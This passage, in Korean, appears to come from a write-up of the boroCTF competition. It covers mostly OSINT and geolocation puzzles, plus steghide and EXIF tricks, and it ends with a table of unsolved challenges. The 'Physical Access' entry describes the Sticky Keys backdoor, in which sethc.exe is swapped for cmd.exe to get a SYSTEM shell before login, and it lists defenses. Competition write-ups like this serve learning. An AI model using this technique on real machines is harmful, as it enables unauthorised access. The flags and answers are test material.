> **문제 설명(원문) (출제 ForeverFlames)**: The sysadmin left behind a single photo of the Boro football field. He said the key was a field goal on game day. We need to recover the corrupted log file he hid, unlock it, and find the flag.

**분석·공격 — 3중 레이어**

**① 손상 헤더 복구 + 숨은 패스프레이즈 판독** — `football_field.jpg` 헤더(`67 67→FF D8`) 복구, 노이즈 강조로 골대 영역의 숨은 텍스트 **"3P0INTERBABY"**("field goal=3점") 판독.

```text
# 증적 ① — 헤더 복구
# JPEG SOI 복구: 67 67 → FF D8, 노이즈 강조 필터로 "3P0INTERBABY" 가시화
```

**② 그 텍스트를 패스프레이즈로 `steghide` 추출 → 암호 zip**

```text
# 증적 ② — misc/steghide_extract.py
$ steghide extract -sf football_field.jpg -p "3P0INTERBABY"   # → out.zip
```

**③ zip 비번=테마어 `football` → flag**

```text
# 증적 ③ — zip 해제
$ python -c "import zipfile; zipfile.ZipFile('out.zip').extractall(pwd=b'football')"
flag.txt → boroctf{pixels_and_passwords_dont_mix}   (소문자!)
```

> ⚠️ **형식 예외.** 이 문제만 소문자 `boroctf{}`(파일 내용 그대로). bkcrack known-plaintext가 실패한 건 평문을 대문자로 줬기 때문.

**FLAG:** `boroctf{pixels_and_passwords_dont_mix}`

### Its a Simple Challenge Really — Misc · Wave4

*기법: **아크로스틱(acrostic)***

**개요·공격**

문장의 각 단어 첫 글자: B-O-R-O-C-T-F + CURLYBRACKET + SIMPLE + UNDERSCORE + OSINT + CURLYBRACKET. 제목이 그대로 힌트.

**FLAG:** `boroCTF{SIMPLE_OSINT}`

## 7. OSINT / Geosint — 공개정보·지리정보

공개 정보로 인물·사건·장소를 특정한다. **위치/인물 확정 ≠ 정확 문자열 확정**이 핵심 병목. 본 분야는 터미널 로그가 없어 **수행 단계 서술 + 실제 도구/URL + 스크린샷**으로 기술한다(허위 transcript 없음). 증적: `writeups/assets/`, `boroctf/g/`·`arg/`.

### Boro Hero — OSINT · 100

*기법: **다단서 인물 식별***

> **문제 설명(원문) (출제 MK)**: This famous Freehold High School alum skipped his graduation and became a best-selling artist.

Flag Format: boroCTF{first_last}

**개요·공격**

3단서(뉴저지 **Freehold** 고교 동문 + 졸업식 불참 + 베스트셀러 아티스트) 교차 → Freehold Borough HS 최고 유명 동문 = **Bruce Springsteen**.

**FLAG:** `boroCTF{bruce_springsteen}`

### The Squad — OSINT · 100

*기법: **대회 메타데이터***

> **문제 설명(원문) (출제 ForeverFlames)**: What is the name of the team that organized boroCTF?

**개요·공격**

CTFtime event 3309 + boroctf.com 메타데이터 → 주최팀 **KyteBytes**. (홈페이지 "Kite Army"는 스폰서 — Distortion와 엮은 함정.)

**FLAG:** `boroCTF{KyteBytes}`

### Satoshi Hunt — OSINT · 100

*기법: **SNS 헌팅 + 위치 트윗** · 도구: **nitter***

> **문제 설명(원문) (출제 ForeverFlames)**: Satoshi Nakamuda always goes on adventures... Where has he gone now...

flag format: boroCTF{location}

**개요·정찰·공격**

이름 "Satoshi Nakamuda"(Nakamoto 변형)로 SNS 헌팅 → X `@SatoshiNakamuda`. **x.com 차단은 nitter로 우회**. 유일 위치 트윗 "The highest point in Japan" → **Mount Fuji**. (이후 Satoshi ARG 출발점.)

**FLAG:** `boroCTF{Mount_Fuji}`

### Nature's Takeover — OSINT · 100

*기법: **역이미지 + 형상/테마 추론***

> **문제 설명(원문) (출제 ForeverFlames)**: You can't beat nature. What is this?

Example if the flag was "not the flag": boroCTF{not_the_flag}

**개요·분석**

역이미지가 阮公墩(브로콜리 섬)과 시드니 난파선을 혼재 반환. **결정** — 250×884 길쭉한 배 모양+꼭대기 구조물=둥근 섬 아닌 난파선. "Nature's Takeover"+선체 맹그로브 숲 = **SS Ayrfield**(Homebush Bay floating forest).

> ⚠️ **교훈.** 역이미지가 유사 후보를 혼재 반환할 때 이미지 형상+문제 테마로 좁힌다. 역이미지 단독 ≠ 정답.

**FLAG:** `boroCTF{ss_ayrfield}`

### Physical Access — OSINT · Solarity

*기법: **Windows 접근성 백도어** · 형식: **boroCTF{explorer.exe}***

> **문제 설명(원문) (출제 Solarity)**: Help!! I forgot my password and got locked out of my Windows PC! I need to get back in, what can I do?! What is one of the two files I can exploit in order to get back into my PC?

**개요·공격**

로그인 화면에서 Shift 5번을 누르면 실행되는 Sticky Keys 프로그램 `C:\Windows\System32\sethc.exe`를 `cmd.exe`로 교체하면 로그인 전 SYSTEM 셸을 얻는 고전 백도어. "두 파일 중 하나"=`sethc.exe`(다른 하나는 `utilman.exe`).

> 💡 **방어.** 접근성 바이너리 무결성 검사, 부팅 디스크 물리 접근 통제, BitLocker.

**FLAG:** `boroCTF{sethc.exe}`

### Oops... — OSINT · Solarity

*기법: **실제 IT 사고 식별** · 형식: **boroCTF{file_name_67}***

> **문제 설명(원문) (출제 Solarity)**: My friend (again) was telling me a story about how around two years ago, he may or may not have accidentally pushed a change to a file that disrupted millions of systems at an unprecedented scale. What was the general name of the configuration file that he modified that broke everything? Flag Format: boroCTF{file_name_67}

**개요·공격**

2024-07-19 **CrowdStrike Falcon**의 결함 업데이트 **Channel File 291**이 전 세계 Windows를 BSOD에 빠뜨린 대란. 형식의 `_67` 힌트대로 채널 파일 번호.

**FLAG:** `boroCTF{channel_file_291}`

### Broken Promise — OSINT · ForeverFlames

*기법: **제로폭(zero-width) 스테가노***

> **문제 설명(원문) (출제 ForeverFlames)**: My friend David has been sobbing uncontrollably recently. He even changed his socials to "SandevastedMoonboy".

**개요·공격**

SNS 핸들 `SandevastedMoonboy`로 Reddit 사용자 추적 → 게시물 평범한 텍스트에 **제로폭 문자(U+200B/U+200C 등)**로 메시지가 숨겨져 있다. 비가시 문자만 추출해 이진→ASCII 복원.

> 💡 **탐지·방어.** 비가시 유니코드 스캔, 입력 정규화(NFKC)로 제로폭 제거.

**FLAG:** `boroCTF{s0rry_w1sh_w3_c0uld_g0_t0_th3_m00n_t0g3th3r}`

### Nature's Delight — Misc · ForeverFlames

*기법: **바코드(UPC) 제조사 조회** · 형식: **boroCTF{tag_maker}***

> **문제 설명(원문) (출제 ForeverFlames)**: I found this tag stuck on the back of my shirt! My friend must have put it... but who even makes these? flag format: boroCTF{tag_maker}

**개요·공격**

라벨의 함정. 이미지 속 **바코드(UPC)**를 읽으면 제조사 코드 `075720` → 조회하면 **Poland Spring** 생수 브랜드. 자연 이미지와 달리 코드가 정체를 폭로.

**FLAG:** `boroCTF{poland_spring}`

### Solarologist — OSINT · 천문 결정론

*기법: **남중시각/낮길이 → 좌표 역산** · 도구: **ephem***

> **문제 설명(원문) (출제 Franklin)**: Description: It was so many years ago now. I remember it was June 17th, 2005. I was doing my research on the culmination, which struck at exactly 13:24:37 UTC+1 during the long 17-hour, 17-minute, and 20-second daylight. I want to go back to that place. I heard that something was built there right on the water, bringing potection to the bridges around it. What is a landmark I can remember it by?

example: boroCTF{tokyo_tower}

**분석·공격**

**① 남중(culmination) 시각 → 경도** — 13:24:37 UTC+1 = 12:24:37 UTC, equation of time 보정 → ≈5.93°W.

```text
# 증적 ① — 경도 역산
lon = (12:00 - solar_noon_UTC)*15° + EoT보정  →  ≈ -5.93°
```

**② 낮 길이 + 태양적위 → 위도** — 17h17m20s 낮길이, 적위 +23.37°, 대기굴절 −0.833° 적용.

```text
# 증적 ② — 위도 역산
cos(H0) = (sin(h0) - sinφ·sinδ)/(cosφ·cosδ)  →  φ ≈ 54.6°N
# (54.6°N, 5.93°W) = 벨파스트 River Lagan
```

**③ ephem 정방향 재현으로 좌표 검증**

```text
# 증적 ③ — python (ephem)
obs=ephem.Observer(); obs.lat,obs.lon='54.6','-5.93'; obs.date='2005/06/17'
# 남중시각·일출일몰 재계산 → 문제값과 초 단위 일치
```

> ⚠️ **함정 (위치 확정 ≠ 랜드마크명 확정).** "물 위 구조물=Lagan Weir"이나 문제는 "그곳을 기억할 landmark"를 물음 → `lagan_weir`류 오답, 정답은 강변 랜드마크 **Beacon of Hope**.

**FLAG:** `boroCTF{beacon_of_hope}`

### Hidden Meaning — OSINT · Wave4

*기법: **곡(가사 다크메시지) 식별** · 비고: **아카이브 미수록***

**개요·공격**

경쾌한 멜로디 뒤의 "숨은 의미"를 가리키는 단서. Foster the People **"Pumped Up Kicks"**(2011) — 밝은 사운드와 달리 가사는 총기난사 화자 시점("all the other kids…better run"). 곡 식별이 곧 답.

**FLAG:** `boroCTF{pumped_up_kicks}`

### Third Time's the Charm — OSINT · Wave4

*기법: **연구자 핸들 교차추적** · 비고: **아카이브 미수록***

**개요·공격**

Windows 0day 연구와 관련해 **GitHub과 GitLab 양쪽에서 밴된 연구자 핸들**을 추적. "세 번째"는 반복된 제재/시도를 암시. 교차 검색으로 핸들 특정.

**FLAG:** `boroCTF{Nightmare_Eclipse}`

### Go Knicks! — OSINT · Wave4

*기법: **4파트 트리비아 조합(멀티-홉)** · 비고: **아카이브 미수록***

**개요·공격**

뉴욕 닉스 트리비아 **4파트 조합**: ① 마스코트 "Dancing Harry" 본명 **Edward Marvin Cooper** + ② 관련 선수 키 **6'8"** + ③ 팀명 어원 인물 **Diedrich** Knickerbocker + ④ 선수 Wat Misaka 출신주 **Utah**.

**FLAG:** `boroCTF{Edward_Marvin_Cooper_6'8"_Diedrich_Utah}`

### I Won't Forget — OSINT · Wave4

*기법: **작품(라이트노벨) 세계관 식별** · 비고: **아카이브 미수록***

**개요·공격**

`report.pdf`의 용어(San Magnolia·Handlers·Spearhead 등)가 라이트노벨 **「86 -에이티식스-」** 세계관임을 식별. "잊지 않겠다"가 가리키는 핵심 인물 = 작중 중심 인물 **Vladilena Milizé(레나)**. (원작자로 푸는 1차 해석은 오답 → 작중 인물로 재해석.)

**FLAG:** `boroCTF{Vladilena_Milizé}`

### Minecraftsint — OSINT · ForeverFlames (시도 2회)

*기법: **Minecraft 바이옴 식별** · 형식: **boroCTF{minecraft_plains}***

> **문제 설명(원문) (출제 ForeverFlames)**: I was tryna hug these green guys when I noticed how beautiful this biome is. What biome am I in? (CAREFUL ONLY 2 ATTEMPTS) (If necessary, seperate any spaces with an underscore) Example flag: boroCTF{minecraft_plains}

**개요·공격**

크리퍼. 눈 블록 지형 + 큰 설산 + 오로라(셰이더) + 나무 없음 → 바이옴 판정 **snowy_slopes**(snowy_plains=잔디+얇은눈, grove=나무有 → 배제). 시도 2회 제한이라 1순위로 1트 해결.

**FLAG:** `boroCTF{minecraft_snowy_slopes}`

### Liminal Memories — OSINT · 200

*기법: **yt-dlp 타임스탬프 추적 + 역이미지***

> **문제 설명(원문) (출제 ForeverFlames)**: I've seen many horrors before. But never on youtube kids. 11:33 This is some creepy imagery... Interesting music choice at 1:50, for that image I would've chosen the better suited music made by the guy who uses that image. How about this... I'll convince the guy to change the music he used when displaying that image if you can find me the name of the guy who makes music under that image. Seperate any spaces with an underscore flag format: boroCTF{user_name}

**분석·공격**

**핵심 교정** — "11:33"은 영상 길이가 아니라 **타임스탬프**(이전 세션의 "25분이라 배제"는 오류).

**① 원본 영상의 11:33 지점에서 다음 영상 식별** — Farrell McGuire "Horrors on YouTube Kids"(20:31)의 11:33에 Liminality "Liminal Spaces…Part 1" 등장.

```text
# 증적 ① — yt-dlp
$ yt-dlp -f best -o liminality.mp4 "https://youtu.be/bx9pj6JogtM"
```

**② 1:50 프레임 추출 → 역이미지 → 음악가 식별** — 채광창+그리스 조각상 베이퍼웨이브 이미지가 **Infinity Frequencies "Between Two Worlds"** 앨범커버.

```text
# 증적 ② — ffmpeg + 역이미지
$ ffmpeg -ss 00:01:50 -i liminality.mp4 -frames:v 1 frame_110.png
# frame_110.png 역이미지 검색(사용자 브라우저) → Infinity Frequencies
```

**FLAG:** `boroCTF{Infinity_Frequencies}`

### Intruder — OSINT · ARG

*기법: **Half-Life 2 Interloper ARG 추적***

**개요·분석**

"Intruder"="Interloper" → HL2 Interloper 미스터리(Project Skybox). "21년 된 발견"=2005년 hl2.net 스레드. "Jman"=기여자, "justinLife"=회의론자, 발견자=OP `|DeV1RTU0S0|x`.

**적대적 검증** — 아카이브 innerText에서 OP 핸들 문자 직접 추출: `|`=ASCII U+007C(박스드로잉 아님; 위키 URL의 `%E2%94%82`는 표시용 치환), 나머지는 leet `DeV1RTU0S0`+`x`. Jman·justinLife 둘 다 스레드 존재 확인 후 제출.

**FLAG:** `boroCTF{|DeV1RTU0S0|x}`

### Geopro 1 — Geosint · ForeverFlames

*기법: **Lens 랜드마크 역검색** · 형식: **boroCTF{city_name}***

> **문제 설명(원문) (출제 ForeverFlames)**: Find the city this image was taken in. flag format: boroCTF{city_name} (Replace any space with an underscore)

**개요·공격**

Google Lens by-URL 역검색으로 랜드마크 **Laxmi Vilas Palace** 식별 → 소재 도시 **Vadodara**(인도).

```text
# Lens by-URL
https://lens.google.com/uploadbyurl?url=<문제파일 토큰 URL>
```

**FLAG:** `boroCTF{vadodara}`

### Geopro 3 — Geosint · ForeverFlames

*기법: **Lens 랜드마크 역검색** · 형식: **boroCTF{building_name}***

> **문제 설명(원문) (출제 ForeverFlames)**: What is the really tall building I'm looking at... flag format: boroCTF{building_name} (Replace any space with an underscore)

**개요·공격**

Lens 역검색으로 **Edmonton Ice District** 식별 → 가장 높은 건물 **JW Marriott Edmonton**.

**FLAG:** `boroCTF{jw_marriott_edmonton}`

### Geopro 5 — Geosint · 게이트 승리 사례

*기법: **역이미지 + 형식 실패=오답 신호** · 비고: **아카이브 미수록***

**개요·분석**

아랍어 자동차상점+산악 풍경. Yandex/Lens가 일관되게 **UAE**로 매칭(걸프 일반장면은 인덱스 많은 UAE로 오매칭)했으나 `UAE`·`United_Arab_Emirates` 전부 오답.

> ⚠️ **게이트 승리.** 역이미지가 일관되게 X라도 검증된 형식이 실패하면 **X가 아니라는 강한 신호** → 추측 말고 재고 끝에 정답 **Oman**.

**FLAG:** `boroCTF{Oman}`

### Panorama Paradise — Geosint · EXIF 결정론 (시도 25회)

*기법: **EXIF 파노라마 ID → photometa 좌표** · 증적: **assets/132_panorama_sample.jpg***

> **문제 설명(원문) (출제 ForeverFlames)**: You may be pretty good at geosint. But are ya good enough?

Find the country in every image, image 1 to image 10. And in the order that they are numbered, order it like that in the flag. Also seperate EVERY space with an underscore,

Seperate each and every space with an underscore (so United States of America, would be United_States_of_America) and each COUNTRY gets seperated with a comma.

Example flag: boroCTF{forever_flames,shiny,satoshi,this_is_not_the_flag}

(NOTE: ONLY 25 MAX ATTEMPTS)

**분석·공격 — 결정론적 3단계 (10개 이미지 각각)**

**① EXIF에서 Google 파노라마 ID 추출** — 이미지가 "Street View Download 360" 산출물이라 `UserComment`에 pano ID가 박혀 있다.

```text
# 증적 ① — exiftool
$ exiftool -UserComment chal_5.jpg     # → Google pano ID
```

**② photometa 엔드포인트로 정확 좌표 조회**

```text
# 증적 ②
$ curl "https://maps.googleapis.com/.../photometa?...&panoid=<ID>"  # lat/lng
```

**③ OSM 역지오코딩으로 국가 확정 (10개 전부)**

```text
# 증적 ③ — Nominatim
# reverse(lat,lng) → country  (image 1~10 순서대로, 공백→_, 쉼표 구분)
```

![파노라마 샘플](assets/132_panorama_sample.jpg)  
*증적: 10장 중 한 파노라마(wave3/g132/5.jpg). 시각판독은 Sri Lanka로 오독했으나 메타데이터 진실은 Myanmar.*

> ⚠️ **교차검증.** 메타데이터(병렬세션)와 크롭 시각판독이 10개 전부 일치. 시각판독 오독(버마→싱할라)도 메타데이터가 진실.

**FLAG:** `boroCTF{argentina,egypt,india,australia,myanmar,ecuador,iceland,kyrgyzstan,ghana,russia}`

## 8. 미해결 17문제 (Discord 포함)

해결 98 + 미해결 17 = 전체 115. 못 푼 문제도 "어디서 왜 막혔나"를 기록한다. ⛔=제한 시도 소진.

| 문제 / 분야 | 좁힌 결과 | 미완 / 사유 |
|---|---|---|
| Player 2 / Crypto 300 | HD영상서 14버튼(숄더 포함) 점등 확정 — "8심볼" 토대오류 돌파 | 14심볼 정밀추출+복호 미완 |
| tuff ash / Misc | Apps Script `fillDecoyFlags`가 디코이로 덮음 | 진짜값=버전기록, 보기전용 게이팅 |
| What's even the POINT? / Misc | 보드게임 리들, ~130후보 오답 | 검증 앵커 0(추측만 가능) |
| Geopro 2 / Geosint | Jizzakh, 우즈베키스탄(DORIXONA) 확정 | 최근접 식당명(Yandex 파노라마 필요) |
| Lake of Doom / Geosint | Karelia/북유럽 한대림 호수 | 정확 호수명 |
| Apocalypse's Sister / Geosint | 9 globe 이미지=허리케인 궤적 | 자매 폭풍 번호/좌표 재구성 |
| Island Boy / Geosint | 섬 풍경 — **⛔ 5/5 소진** | 추가 시도 불가 |
| It's So Easy / OSINT | Slash/GnR NITL 투어 — **⛔ 3/3 소진** | Zürich 추측 오답(1차출처 미확인) |
| ARG (Satoshi) / OSINT | 첫 테이프 Brainfuck 완전해독→firstname=**Sid** | 둘째 테이프=비공개 TikTok(사용자 팔로우 필요) |
| Nutella / OSINT | 주 견과 법안 관련 인물 | 인물 미특정(전제 의심) |
| Where there's smoke / OSINT | Sherwood AR, Eagle Point Dr 화재 인근 | 거리의 옛 이름(개명기록 미발견) |
| Am I Obsessed? / OSINT | 영화 "Obsession"(2025), 인용구 일치 | 배우(연필 스케치=드로잉끼리만 매칭) |
| Far Far Away / OSINT | "Viking 1·2 삼각형 제3점" | 화성 착륙선 가설 전멸 |
| Planetary Destruction / Misc | gif id `e2STziuFWUS` | 삭제 영상+아카이브 전무 |
| Satoshi's Revenge / OSINT | 리들 → github.com/satoshi | 플래그 위치 미발견 |
| Join the Discord / Getting Started | 0점 안내 문제 | 디스코드 참여 미수행(점수 무영향) |

Player 2 14버튼 점등 히트맵
Geopro 2 Jizzakh 확정
